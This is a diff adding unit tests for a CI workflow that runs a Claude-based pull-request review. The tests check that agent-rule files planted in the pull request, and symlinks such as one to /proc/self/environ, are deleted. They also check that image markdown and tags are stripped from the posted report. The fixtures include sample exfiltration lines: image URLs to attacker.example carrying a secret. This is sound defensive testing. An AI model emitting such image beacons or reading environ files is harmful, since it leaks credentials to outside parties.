@@ -1,6 +1,10 @@
 """Run with: python3 -m unittest discover -s tests"""
+import os
 import re
+import subprocess
 import sys
+import tempfile
+import textwrap
 import unittest
 from pathlib import Path
 
@@ -19,6 +23,7 @@ HEAD = "Check out the pull request's head"
 PROMPT = "Run the review-pr skill: build the prompt"
 CLAUDE = "Run the review-pr skill on Claude"
 POST = "Post the report as one comment"
+RULES = "Remove the pull request's own rules"
 
 
 def children(text, key):
@@ -55,6 +60,12 @@ class ReusableReviewWorkflow(unittest.TestCase):
 
     def secrets_in(self, name):
         return set(re.findall(r"secrets\.(\w+)", self.step(name)))
+
+    def run_in(self, name, cwd, **env):
+        """Run a step's script from `cwd`, as Actions would from the workspace."""
+        script = self.step(name).split("run: |\n", 1)[1]
+        return subprocess.run(["bash", "--noprofile", "--norc", "-eo", "pipefail", "-c", textwrap.dedent(script)],
+                              cwd=cwd, env={"PATH": os.environ["PATH"], **env}, capture_output=True, text=True)
 
     def test_it_runs_only_when_another_workflow_calls_it(self):
         self.assertEqual(children(self.code, "on"), ["workflow_call"])
@@ -169,7 +180,49 @@ class ReusableReviewWorkflow(unittest.TestCase):
         for name in (BASE, HEAD):
             self.assertIn("persist-credentials: false", self.step(name), name)
             self.assertNotIn("ssh-key", self.step(name), name)
-        self.assertIn("rm -f head/AGENTS.md head/CLAUDE.md", self.step("Remove the pull request's own rules"))
+        self.assertIn("find head", self.step(RULES))
+
+    def test_the_pull_request_s_rules_go_at_any_depth(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            head = Path(tmp) / "head"
+            gone = ["AGENTS.md", "CLAUDE.md", "CLAUDE.local.md", "src/CLAUDE.md", "src/CLAUDE.local.md",
+                    "deep/a/AGENTS.md", ".claude/settings.json", "src/.claude/agents/x.md"]
+            kept = ["README.md", "src/app.py", "docs/CLAUDE.md.txt", ".git/config", ".git/CLAUDE.md"]
+            for path in gone + kept:
+                (head / path).parent.mkdir(parents=True, exist_ok=True)
+                (head / path).write_text("x")
+            (head / "docs" / "CLAUDE.md").symlink_to("../README.md")
+            (head / "environ").symlink_to("/proc/self/environ")
+            (head / "outside").symlink_to(tmp)
+            result = self.run_in(RULES, tmp)
+            self.assertEqual(result.returncode, 0, result.stderr)
+            for path in gone + ["docs/CLAUDE.md", "environ", "outside", ".claude", "src/.claude"]:
+                self.assertFalse(os.path.lexists(head / path), path)
+            for path in kept:
+                self.assertTrue((head / path).is_file(), path)
+
+    def test_the_posted_report_carries_no_image(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            bin_dir = Path(tmp) / "bin"
+            bin_dir.mkdir()
+            (bin_dir / "gh").write_text("#!/bin/sh\nexit 0\n")
+            (bin_dir / "gh").chmod(0o755)
+            (Path(tmp) / "report.md").write_text(
+                "Changes needed.\n"
+                "![x](https://attacker.example/a?k=secret)\n"
+                "![ref][1]\n"
+                '<img src="https://attacker.example/b">\n'
+                '<IMG SRC="https://attacker.example/c">\n'
+                '<picture><source srcset="https://attacker.example/d"></picture>\n'
+                "`Vec<String>` is fine.\n")
+            result = self.run_in(POST, tmp, RUNNER_TEMP=tmp, PATH=f"{bin_dir}:{os.environ['PATH']}",
+                                 REPO="o/r", PR="1", GH_TOKEN="")
+            self.assertEqual(result.returncode, 0, result.stderr)
+            comment = (Path(tmp) / "comment.md").read_text()
+            self.assertNotIn("![", comment)
+            self.assertNotRegex(comment, r"(?i)<\s*/?\s*(img|picture|source)\b")
+            self.assertIn("Changes needed.", comment)
+            self.assertIn("`Vec<String>` is fine.", comment)
 
     def test_the_prompt_points_at_the_three_folders(self):
         prompt = self.step(PROMPT)
